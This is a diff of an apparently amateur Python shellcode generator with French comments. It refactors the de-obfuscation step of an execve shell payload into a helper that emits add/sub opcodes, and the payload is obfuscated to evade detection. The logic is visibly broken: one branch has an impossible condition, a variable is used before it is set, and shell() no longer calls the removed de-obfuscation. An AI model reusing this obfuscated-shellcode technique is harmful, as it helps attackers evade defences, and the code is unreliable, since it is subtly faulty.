@@ -97,6 +97,56 @@ def offus(string4Payload, rand):
     
     return newString
 
+#Renvoit l'opcode pour soustraire ou additionnner ce qui rend la désoffuscation possible
+def deOffus(factorOffusVar):
+
+    #On a add donc on va re sub la différence additionnée
+    if factorOffusVar < 0 :
+        factorOffusVar *= -1 
+        if factorOffusVar < 10 :
+            addString = ""
+            for i in range(7):
+                addString+="0"+str(factorOffusVar)
+            return "4883eb"+addString
+        
+        elif factorOffusVar >= 10 :
+            newFactor = ""
+            if factorOffusVar == 10 : newFactor = "a"
+            elif factorOffusVar == 11 : newFactor = "b"
+            elif factorOffusVar == 12 : newFactor = "c"
+            elif factorOffusVar == 13 : newFactor = "d"
+            elif factorOffusVar == 14 : newFactor = "e"
+            elif factorOffusVar == 15 : newFactor = "f"
+
+            for i in range(7):
+                addString+="0"+str(newFactor)
+
+            return "4883eb"+addString
+        
+    #On a sub donc on va re add la différence soustraite
+    elif factorOffusVar > 0 :
+        if factorOffusVar <= -10 :
+
+            addString = ""
+            for i in range(7):
+                addString+="0"+str(factorOffusVar)
+
+            return "4883c3"+addString
+        
+        elif factorOffusVar > -10 :
+            newFactor = ""
+            if factorOffusVar == 10 : newFactor = "a"
+            elif factorOffusVar == 11 : newFactor = "b"
+            elif factorOffusVar == 12 : newFactor = "c"
+            elif factorOffusVar == 13 : newFactor = "d"
+            elif factorOffusVar == 14 : newFactor = "e"
+            elif factorOffusVar == 15 : newFactor = "f"
+
+            for i in range(7):
+                addString+="0"+str(newFactor)
+
+            return "4883c3"+addString 
+
 
 def clean(reg):
     if str(reg) == "rax":
@@ -229,53 +279,7 @@ def shell():
     PAYLOAD+="57" #push rdi
     PAYLOAD+="4889e6" #mov rsi, rsp
 
-    #Désoffuscation
-    #On a add donc on va re sub la différence additionnée
-    if factorOffusVar < 0 :
-        factorOffusVar *= -1 
-        if factorOffusVar < 10 :
-            addString = ""
-            for i in range(7):
-                addString+="0"+str(factorOffusVar)
-            PAYLOAD+="4883eb"+addString
-        
-        elif factorOffusVar >= 10 :
-            newFactor = ""
-            if factorOffusVar == 10 : newFactor = "a"
-            elif factorOffusVar == 11 : newFactor = "b"
-            elif factorOffusVar == 12 : newFactor = "c"
-            elif factorOffusVar == 13 : newFactor = "d"
-            elif factorOffusVar == 14 : newFactor = "e"
-            elif factorOffusVar == 15 : newFactor = "f"
-
-            for i in range(7):
-                addString+="0"+str(newFactor)
-
-            PAYLOAD+="4883eb"+addString
-        
-    #On a sub donc on va re add la différence soustraite
-    elif factorOffusVar > 0 :
-        if factorOffusVar <= -10 :
-
-            addString = ""
-            for i in range(7):
-                addString+="0"+str(factorOffusVar)
-
-            PAYLOAD+="4883c3"+addString
-        
-        elif factorOffusVar > -10 :
-            newFactor = ""
-            if factorOffusVar == 10 : newFactor = "a"
-            elif factorOffusVar == 11 : newFactor = "b"
-            elif factorOffusVar == 12 : newFactor = "c"
-            elif factorOffusVar == 13 : newFactor = "d"
-            elif factorOffusVar == 14 : newFactor = "e"
-            elif factorOffusVar == 15 : newFactor = "f"
-
-            for i in range(7):
-                addString+="0"+str(newFactor)
-
-            PAYLOAD+="4883c3"+addString    
+    #Déoffucation   
 
     #Appel systeme
     PAYLOAD+="b03b" #mov al, 0x3b
